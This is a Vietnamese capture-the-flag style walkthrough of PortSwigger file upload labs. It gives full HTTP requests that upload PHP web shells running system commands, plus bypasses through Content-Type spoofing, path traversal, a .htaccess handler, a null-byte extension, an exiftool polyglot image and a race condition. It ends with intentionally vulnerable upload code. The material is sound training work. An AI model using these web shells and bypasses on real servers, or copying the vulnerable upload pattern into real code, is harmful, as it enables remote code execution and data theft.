# File upload vulnerabilities

## **Lab: Remote code execution via web shell upload**

[Lab: Remote code execution via web shell upload | Web Security Academy](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

- Thực hiện login vào tài khoản `wiener:peter` . Thực hiện điều hướng đến chức năng `My account` . Tại đây, upload avatar
    
    ![image.png](File%20upload%20vulnerabilities/image.png)
    

- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /my-account/avatar` . Thực hiện chỉnh sửa body request theo body của request sau:
    
    ```php
    POST /my-account/avatar HTTP/2
    Host: 0a7b0066045fb841846a1d1900ff0070.web-security-academy.net
    Cookie: session=GjTh4P9vOjw1rysz1b7rKvtOdjnbOdkn
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.9
    Accept-Encoding: gzip, deflate, br
    Content-Type: multipart/form-data; boundary=----geckoformboundarycb71a082a77122f382c635cbd286e56
    Content-Length: 502
    Origin: https://0a7b0066045fb841846a1d1900ff0070.web-security-academy.net
    Referer: https://0a7b0066045fb841846a1d1900ff0070.web-security-academy.net/my-account?id=wiener
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Priority: u=0, i
    Te: trailers
    
    ------geckoformboundarycb71a082a77122f382c635cbd286e56
    Content-Disposition: form-data; name="avatar"; filename="avatar-anh-meo-cute-1.php"
    Content-Type: application/x-php
    
    <?php phpinfo();?>
    ------geckoformboundarycb71a082a77122f382c635cbd286e56
    Content-Disposition: form-data; name="user"
    
    wiener
    ------geckoformboundarycb71a082a77122f382c635cbd286e56
    Content-Disposition: form-data; name="csrf"
    
    t8U7lPhe3jAC9ha1yBflU5kGDsssDEQs
    ------geckoformboundarycb71a082a77122f382c635cbd286e56--
    
    ```
    
- Thực hiện truy cập đường dẫn file đã upload. Quan sát thấy file thực thi thành công
    
    ![image.png](File%20upload%20vulnerabilities/image%201.png)
    

- Thực hiện đọc file bằng cách gửi request sau:
    - Request
        
        ```php
        POST /my-account/avatar HTTP/2
        Host: 0a7b0066045fb841846a1d1900ff0070.web-security-academy.net
        Cookie: session=GjTh4P9vOjw1rysz1b7rKvtOdjnbOdkn
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: multipart/form-data; boundary=----geckoformboundarycb71a082a77122f382c635cbd286e56
        Content-Length: 526
        Origin: https://0a7b0066045fb841846a1d1900ff0070.web-security-academy.net
        Referer: https://0a7b0066045fb841846a1d1900ff0070.web-security-academy.net/my-account?id=wiener
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        ------geckoformboundarycb71a082a77122f382c635cbd286e56
        Content-Disposition: form-data; name="avatar"; filename="avatar-anh-meo-cute-1.php"
        Content-Type: application/x-php
        
        <?php system("cat /home/carlos/secret");?>
        ------geckoformboundarycb71a082a77122f382c635cbd286e56
        Content-Disposition: form-data; name="user"
        
        wiener
        ------geckoformboundarycb71a082a77122f382c635cbd286e56
        Content-Disposition: form-data; name="csrf"
        
        t8U7lPhe3jAC9ha1yBflU5kGDsssDEQs
        ------geckoformboundarycb71a082a77122f382c635cbd286e56--
        
        ```
        
    - Thực thi code và đọc được secret. Hoàn thành giải lab
        
        ![image.png](File%20upload%20vulnerabilities/image%202.png)
        
        ![image.png](File%20upload%20vulnerabilities/image%203.png)
        

## **Lab: Web shell upload via Content-Type restriction bypass**

[Lab: Web shell upload via Content-Type restriction bypass | Web Security Academy](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

- Thực hiện login vào tài khoản `wiener:peter` . Điều hướng đến chức năng `My account > Avatar > Upload Avatar` .
    
    ![image.png](File%20upload%20vulnerabilities/image%204.png)
    
- Thực hiện upload file `php` thì bị server chặn → server kiểm tra dựa trên `application/x-php` → attacker kiểm soát được.
    
    ![image.png](File%20upload%20vulnerabilities/image%205.png)
    
- Để `Content-Type` là dang hợp lệ `image/jpeg` và thực hiện upload được file `php` thành công
    
    ```php
    POST /my-account/avatar HTTP/2
    Host: 0aa8003704e7a76c80a2772500510004.web-security-academy.net
    Cookie: session=D8ovaY5ZOtht4GfjkHvH8oHF6xLflqzo
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.9
    Accept-Encoding: gzip, deflate, br
    Content-Type: multipart/form-data; boundary=----geckoformboundarydc2377ec97703fe7d732ff83bedae4e3
    Content-Length: 523
    Origin: https://0aa8003704e7a76c80a2772500510004.web-security-academy.net
    Referer: https://0aa8003704e7a76c80a2772500510004.web-security-academy.net/my-account?id=wiener
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Priority: u=0, i
    Te: trailers
    
    ------geckoformboundarydc2377ec97703fe7d732ff83bedae4e3
    Content-Disposition: form-data; name="avatar"; filename="avatar-anh-meo-cute-1.php"
    Content-Type: image/jpeg
    
    <?php system("cat /home/carlos/secret");?>
    ------geckoformboundarydc2377ec97703fe7d732ff83bedae4e3
    Content-Disposition: form-data; name="user"
    
    wiener
    ------geckoformboundarydc2377ec97703fe7d732ff83bedae4e3
    Content-Disposition: form-data; name="csrf"
    
    xTQUmgkVtGP9a4aai9IUSntLj0xb5GkR
    ------geckoformboundarydc2377ec97703fe7d732ff83bedae4e3--
    
    ```
    
    ![image.png](File%20upload%20vulnerabilities/image%206.png)
    
- Thực hiện truy cập file đã upload → code được thực thi → submit secret hoàn thành giải lab
    
    ![image.png](File%20upload%20vulnerabilities/image%207.png)
    
    ![image.png](File%20upload%20vulnerabilities/image%208.png)
    

## **Lab: Web shell upload via path traversal**

[Lab: Web shell upload via path traversal | Web Security Academy](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

- Trước hết, login với tài khoản `wiener:peter` . Điều hướng đến chức năng `My account > Avatar > Upload` . Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /my-account/avatar` và chuyển sang tab Repeater. Tại đây, thực hiện upload file php bằng request sau:
    - Request
        
        ```php
        POST /my-account/avatar HTTP/2
        Host: 0a9000320447c7f8818789a100cd005c.web-security-academy.net
        Cookie: session=XsdPw8VeEafilI8v7A1LPtLmPTHq686F
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: multipart/form-data; boundary=----geckoformboundaryd218eeb73cc709158f9edb40eafa251e
        Content-Length: 523
        Origin: https://0a9000320447c7f8818789a100cd005c.web-security-academy.net
        Referer: https://0a9000320447c7f8818789a100cd005c.web-security-academy.net/my-account
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        ------geckoformboundaryd218eeb73cc709158f9edb40eafa251e
        Content-Disposition: form-data; name="avatar"; filename="1772433842_a.php"
        Content-Type: application/x-php
        
        <?php echo system($_GET['command']); ?>
        ------geckoformboundaryd218eeb73cc709158f9edb40eafa251e
        Content-Disposition: form-data; name="user"
        
        wiener
        ------geckoformboundaryd218eeb73cc709158f9edb40eafa251e
        Content-Disposition: form-data; name="csrf"
        
        q7TvlQuePGWpCcyGYLHGhikGvmJa9S7B
        ------geckoformboundaryd218eeb73cc709158f9edb40eafa251e--
        
        ```
        
- Mặc dù, chúng ta upload thành công thì chúng ta vẫn chỉ nhận lại plain text mà code không thực thi
    
    ![image.png](File%20upload%20vulnerabilities/image%209.png)
    
- Tuy nhiên, tại chức năng upload file có lỗi path traversal → thử upload ở thư mục cho phép file được thực thi
    - Request
        
        ```php
        POST /my-account/avatar HTTP/2
        Host: 0a9000320447c7f8818789a100cd005c.web-security-academy.net
        Cookie: session=XsdPw8VeEafilI8v7A1LPtLmPTHq686F
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: multipart/form-data; boundary=----geckoformboundaryd218eeb73cc709158f9edb40eafa251e
        Content-Length: 523
        Origin: https://0a9000320447c7f8818789a100cd005c.web-security-academy.net
        Referer: https://0a9000320447c7f8818789a100cd005c.web-security-academy.net/my-account
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        ------geckoformboundaryd218eeb73cc709158f9edb40eafa251e
        Content-Disposition: form-data; name="avatar"; filename="..%2f1772433842_a.php"
        Content-Type: application/x-php
        
        <?php echo system($_GET['command']); ?>
        ------geckoformboundaryd218eeb73cc709158f9edb40eafa251e
        Content-Disposition: form-data; name="user"
        
        wiener
        ------geckoformboundaryd218eeb73cc709158f9edb40eafa251e
        Content-Disposition: form-data; name="csrf"
        
        q7TvlQuePGWpCcyGYLHGhikGvmJa9S7B
        ------geckoformboundaryd218eeb73cc709158f9edb40eafa251e--
        
        ```
        
    - Response
        
        ![image.png](File%20upload%20vulnerabilities/image%2010.png)
        
- Thực hiện submit secret. Hoàn thành giải lab
    
    ![image.png](File%20upload%20vulnerabilities/image%2011.png)
    

## **Lab: Web shell upload via extension blacklist bypass**

[Lab: Web shell upload via extension blacklist bypass | Web Security Academy](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

- Cách web server xử lý khi gặp file php đó là sẽ có 1 handler, nó sẽ tìm xem extension đó sẽ cho handler nào xử lý (ví dụ PHP thì chuyển cho PHP engine, …). File `httpd.conf` của apache hoặc `nginx.conf` , `.htaccess` . Ví dụ đây là cách cấu hình `.htaccess` để thêm handler
    
    ```bash
    AddHandler application/x-httpd-php .html
    ```
    
- Trong bài này, chúng ta bị chặn mọi dạng file php → nhưng file khác thì upload tự do. Như vậy chúng ta có thể upload file `.htaccess` và thêm handler cho extension bất kỳ mà upload thành công.
- Trước hết, Trước hết, login với tài khoản `wiener:peter` . Điều hướng đến chức năng `My account > Avatar > Upload` . Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /my-account/avatar` và chuyển sang tab Repeater. Tại đây, thực hiện upload file php bằng request sau: thực hiện upload `.htaccess` với request sau:
    - Request
        
        ```php
        POST /my-account/avatar HTTP/2
        Host: 0a8600350493bb19805cee8a00cc00cf.web-security-academy.net
        Cookie: session=8c44O6r5k16Kqo3JSPStxDdw4ULnjiWt
        User-Agent: admin
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a8600350493bb19805cee8a00cc00cf.web-security-academy.net/my-account?id=wiener
        Content-Type: multipart/form-data; boundary=----geckoformboundary42b54b7e8bbdae772ff9c35b338138ae
        Content-Length: 504
        Origin: https://0a8600350493bb19805cee8a00cc00cf.web-security-academy.net
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        ------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae
        Content-Disposition: form-data; name="avatar"; filename=".htaccess"
        Content-Type: image/png
        
        AddHandler application/x-httpd-php .xxxx
        ------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae
        Content-Disposition: form-data; name="user"
        
        wiener
        ------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae
        Content-Disposition: form-data; name="csrf"
        
        KkPoHayfXmgfVPNaBQ8mVKPPNGyFR23g
        ------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae--
        
        ```
        
    - Response
        
        ![image.png](File%20upload%20vulnerabilities/image%2012.png)
        
- Sau đó, thực hiện upload 1 file extension `.xxxx` bằng request sau:
    - Request:
        
        ```php
        POST /my-account/avatar HTTP/2
        Host: 0a8600350493bb19805cee8a00cc00cf.web-security-academy.net
        Cookie: session=8c44O6r5k16Kqo3JSPStxDdw4ULnjiWt
        User-Agent: admin
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a8600350493bb19805cee8a00cc00cf.web-security-academy.net/my-account?id=wiener
        Content-Type: multipart/form-data; boundary=----geckoformboundary42b54b7e8bbdae772ff9c35b338138ae
        Content-Length: 489
        Origin: https://0a8600350493bb19805cee8a00cc00cf.web-security-academy.net
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        ------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae
        Content-Disposition: form-data; name="avatar"; filename="a.xxxx"
        Content-Type: image/png
        
        <?php  system($_GET["a"]);?>
        ------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae
        Content-Disposition: form-data; name="user"
        
        wiener
        ------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae
        Content-Disposition: form-data; name="csrf"
        
        KkPoHayfXmgfVPNaBQ8mVKPPNGyFR23g
        ------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae--
        
        ```
        
    - Response
        
        ![image.png](File%20upload%20vulnerabilities/image%2013.png)
        
- Thực hiện gửi request sau để RCE và đọc secret
    - Request:
        
        ```php
        GET /files/avatars/a.xxxx?a=cat%20%2fhome%2fcarlos%2fsecret HTTP/2
        Host: 0a8600350493bb19805cee8a00cc00cf.web-security-academy.net
        Cookie: session=8c44O6r5k16Kqo3JSPStxDdw4ULnjiWt
        User-Agent: admin
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a8600350493bb19805cee8a00cc00cf.web-security-academy.net/my-account
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        If-Modified-Since: Tue, 24 Mar 2026 08:20:47 GMT
        If-None-Match: "62b-64dc0d4155e51"
        Priority: u=0, i
        Te: trailers
        
        ```
        
    - Response
        
        ![image.png](File%20upload%20vulnerabilities/image%2014.png)
        
- Submit secret và hoàn thành giải lab
    
    ![image.png](File%20upload%20vulnerabilities/image%2015.png)
    

## **Lab: Web shell upload via obfuscated file extension**

[Lab: Web shell upload via obfuscated file extension | Web Security Academy](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

- Trước hết, login với tài khoản `wiener:peter` . Điều hướng đến chức năng `My account > Avatar > Upload` . Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /my-account/avatar` và chuyển sang tab Repeater. Tại đây, thực hiện upload file php bằng request sau:
    
    ```php
    POST /my-account/avatar HTTP/2
    Host: 0adb007e045fe7a0823ca684004e0088.web-security-academy.net
    Cookie: session=ysriazlinFFujGqkTr375IclT5Z1nfq2
    User-Agent: admin
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.9
    Accept-Encoding: gzip, deflate, br
    Referer: https://0adb007e045fe7a0823ca684004e0088.web-security-academy.net/my-account?id=wiener
    Content-Type: multipart/form-data; boundary=----geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb
    Content-Length: 496
    Origin: https://0adb007e045fe7a0823ca684004e0088.web-security-academy.net
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Priority: u=0, i
    Te: trailers
    
    ------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb
    Content-Disposition: form-data; name="avatar"; filename="abc.php%00.jpg"
    Content-Type: image/png
    
    <?php system($_GET['a']);?>
    ------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb
    Content-Disposition: form-data; name="user"
    
    wiener
    ------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb
    Content-Disposition: form-data; name="csrf"
    
    lML5bRHpcvZICkjkKNZGHwcfiBqwkDup
    ------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb--
    
    ```
    
- Ở đây, chúng ta dùng null byte. Trường hợp có thể bypass được bằng cách này đó là khi hàm validate viết bằng PHP hoặc Java nhưng server xử lý bằng ngôn ngữ bậc thấp hơn như C/C++
    - Request
        
        ```html
        POST /my-account/avatar HTTP/2
        Host: 0adb007e045fe7a0823ca684004e0088.web-security-academy.net
        Cookie: session=ysriazlinFFujGqkTr375IclT5Z1nfq2
        User-Agent: admin
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0adb007e045fe7a0823ca684004e0088.web-security-academy.net/my-account?id=wiener
        Content-Type: multipart/form-data; boundary=----geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb
        Content-Length: 496
        Origin: https://0adb007e045fe7a0823ca684004e0088.web-security-academy.net
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        ------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb
        Content-Disposition: form-data; name="avatar"; filename="abc.php%00.jpg"
        Content-Type: image/png
        
        <?php system($_GET['a']);?>
        ------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb
        Content-Disposition: form-data; name="user"
        
        wiener
        ------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb
        Content-Disposition: form-data; name="csrf"
        
        lML5bRHpcvZICkjkKNZGHwcfiBqwkDup
        ------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb--
        
        ```
        
    - Response
        
        ![image.png](File%20upload%20vulnerabilities/image%2016.png)
        
- Kết quả đọc secret. Thực hiện submit hoàn thành giải lab
    
    ![image.png](File%20upload%20vulnerabilities/image%2017.png)
    
    ![image.png](File%20upload%20vulnerabilities/image%2018.png)
    

## **Lab: Remote code execution via polyglot web shell upload**

[Lab: Remote code execution via polyglot web shell upload | Web Security Academy](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

- Trước hết, login với tài khoản `wiener:peter` . Điều hướng đến chức năng `My account > Avatar > Upload` . Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /my-account/avatar` và chuyển sang tab Repeater.
- Ở bài lab này, chúng ta có thể upload file extension php nhưng với nội dung là file png, jpeg. Vì vậy chúng ta có thể tạo file polygot với chèn thêm payload, sau đó upload file với extension php để thực thi.
- Trước hết, tạo file polygot với Exiftool bằng command sau:
    - Command
        
        ```html
        exiftool.exe -Comment="<?php echo system($_GET['cmd']); ?>" content.png -o mal1.png
            1 image files created
        ```
        
    - Cấu trúc thư mục như sau
        
        ![image.png](File%20upload%20vulnerabilities/image%2019.png)
        
- Thực hiện upload ảnh `mal1.png` , trong phần mềm Burpsuite, bắt request gửi tới API `POST /my-account/avatar` , chỉnh sửa extension file upload thành `php` như sau:
    
    ![image.png](File%20upload%20vulnerabilities/image%2020.png)
    
- Thực hiện gửi request sau để RCE và đọc file
    - Request
        
        ```html
        GET /files/avatars/mal1.php?cmd=cat%20%2fhome%2fcarlos%2fsecret HTTP/2
        Host: 0a5000a804b8747886decb15005000d8.web-security-academy.net
        Cookie: session=ChumR2bUgi0N8V6ttretf3PmuDsIYqzJ
        User-Agent: admin
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: none
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        ```
        
    - Response
        
        ![image.png](File%20upload%20vulnerabilities/image%2021.png)
        
- Submit secret, hoàn thành giải lab
    
    ![image.png](File%20upload%20vulnerabilities/image%2022.png)
    

## **Lab: Web shell upload via race condition**

[Lab: Web shell upload via race condition | Web Security Academy](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

- Trước hết, bài này có thể code backend xử lý theo cách đó là vẫn cho phép lưu file ra file system, sau đó mới check nếu file không hợp lệ thì mới xóa → như vậy quãng kiểm tra ở giữa chúng ta vẫn có thể access file → race condition
- Thực hiện login bằng tài khoản `wiener:peter` . Thực hiện điều hướng đến chức năng `My-account` . Tại đây, thực hiện upload avatar. Tuy nhiên ở đây đã có cơ chế chặn upload file khác `png, jpg` và không thể khai thác bằng cách thêm null byte, đổi mime-type,…
- Thực hiện ý tưởng ở đầu, chúng ta sẽ thực hiện race condition như sau:
    - Request upload file
        
        ```html
        POST /my-account/avatar HTTP/2
        Host: 0a2800260467fb43812d07d00093007a.web-security-academy.net
        Cookie: session=wBCq62PmWy41kNmEKQEQLufU27jtpqMF
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: multipart/form-data; boundary=----geckoformboundary2ae16990317e4e9dd5d1f2f723c1bfed
        Content-Length: 521
        Origin: https://0a2800260467fb43812d07d00093007a.web-security-academy.net
        Referer: https://0a2800260467fb43812d07d00093007a.web-security-academy.net/my-account
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        ------geckoformboundary2ae16990317e4e9dd5d1f2f723c1bfed
        Content-Disposition: form-data; name="avatar"; filename="1772433743_a.php"
        Content-Type: application/x-php
        
        <?php system("cat /home/carlos/secret");?>
        ------geckoformboundary2ae16990317e4e9dd5d1f2f723c1bfed
        Content-Disposition: form-data; name="user"
        
        wiener
        ------geckoformboundary2ae16990317e4e9dd5d1f2f723c1bfed
        Content-Disposition: form-data; name="csrf"
        
        SwpBNmWRYnWjpLzMu2DumdCIGM0Vrtxj
        ------geckoformboundary2ae16990317e4e9dd5d1f2f723c1bfed--
        
        ```
        
    - Khi thực hiện upload file hợp lệ, server trả về đường dẫn file
        
        ![image.png](File%20upload%20vulnerabilities/image%2023.png)
        
    - Như vậy, chúng ta có thể thực hiện gọi file php upload trước khi nó bị xóa bằng request sau:
        
        ```html
        GET /files/avatars/1772433743_a.php HTTP/2
        Host: 0a2800260467fb43812d07d00093007a.web-security-academy.net
        Cookie: session=wBCq62PmWy41kNmEKQEQLufU27jtpqMF
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a2800260467fb43812d07d00093007a.web-security-academy.net/my-account
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        If-Modified-Since: Tue, 24 Mar 2026 03:10:34 GMT
        If-None-Match: "fb54-64dbc7eab2589"
        Priority: u=0, i
        Te: trailers
        
        ```
        
    - Thực hiện gửi song song các request trên bằng chế độ `Send parallel` trong Repeater
        
        ![image.png](File%20upload%20vulnerabilities/image%2024.png)
        
    - Quan sát thấy có reponse trả về secret → thực hiện submit và hoàn thành việc giải lab
        
        ![image.png](File%20upload%20vulnerabilities/image%2025.png)
        
        ![image.png](File%20upload%20vulnerabilities/image%2026.png)
        
- Code phía backend có thể như này
    
    ```php
    <?php
    $target_dir = "files/avatars/";
    $upload_ok = true;
    
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $file_name = basename($_FILES["avatar"]["name"]);
        $target_file = $target_dir . $file_name;
    
        if (move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file)) {      
            $image_info = getimagesize($target_file);
            if ($image_info === false) {
                
                unlink($target_file); 
                echo "Lỗi: File không phải là ảnh hợp lệ và đã bị xóa.";
                $upload_ok = false;
            } else {
                echo "Upload thành công!";
            }
        }
    }
    ?>
    ```